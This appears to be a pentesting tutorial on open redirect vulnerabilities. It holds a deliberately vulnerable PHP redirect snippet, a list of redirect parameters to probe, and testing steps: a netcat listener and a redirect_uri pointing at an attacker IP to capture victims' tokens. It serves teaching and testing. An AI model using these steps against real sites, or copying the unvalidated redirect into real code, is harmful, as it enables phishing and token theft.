# Open Redirect

An **Open Redirect** vulnerability allows an attacker to redirect users from a legitimate site to a malicious one by exploiting the site's redirection functionality. This occurs when the application does not validate the URLs to which it redirects users. Attackers can leverage this vulnerability to lead victims to their controlled sites, often during the initial access phase of an attack.

#### 🔍 Understanding the Vulnerability

The core issue arises from code that directly uses user input for redirection without validation. Here’s a simplified example in PHP:

```php
$red = $_GET['url'];
header("Location: " . $red);
```

* **Line 1**: The variable `$red` is assigned the value from the `url` parameter using the `$_GET` superglobal.
* **Line 2**: The `header` function sends a raw redirect to the URL specified in `$red`, without any checks.

This code snippet demonstrates an Open Redirect vulnerability, as it allows any URL to be passed, including malicious ones.

#### ⚠️ Example of Exploitation

An attacker could craft a URL like this to exploit the vulnerability:

```
trusted.site/index.php?url=https://evil.com
```

#### 🔑 Common URL Parameters to Check

When searching for Open Redirect vulnerabilities, look for these common parameters, especially in login pages:

* `?url=`
* `?link=`
* `?redirect=`
* `?redirecturl=`
* `?redirect_uri=`
* `?return=`
* `?return_to=`
* `?returnurl=`
* `?go=`
* `?goto=`
* `?exit=`
* `?exitpage=`
* `?fromurl=`
* `?fromuri=`
* `?redirect_to=`
* `?next=`
* `?newurl=`
* `?redir=`

#### 🛠️ Testing for Open Redirect

To test if an application is vulnerable, follow these steps:

1.  **Set up a Netcat listener**:

    ```bash
    nc -lvnp 1337
    ```
2. **Navigate to the target application** (e.g., `http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN>`).
3.  **Modify the URL** to point to your listener:

    {% code overflow="wrap" %}
    ```
    http://oredirect.example.com/?redirect_uri=http://<ATTACKER_IP>:PORT&token=<RANDOM TOKEN>
    ```
    {% endcode %}
4. **Simulate the victim** by opening a new private window and navigating to the modified URL.
5. **Observe the connection**: When the victim enters their email, you should see a connection to your listener, indicating that the application is indeed vulnerable to Open Redirect. The captured request may also include sensitive tokens.
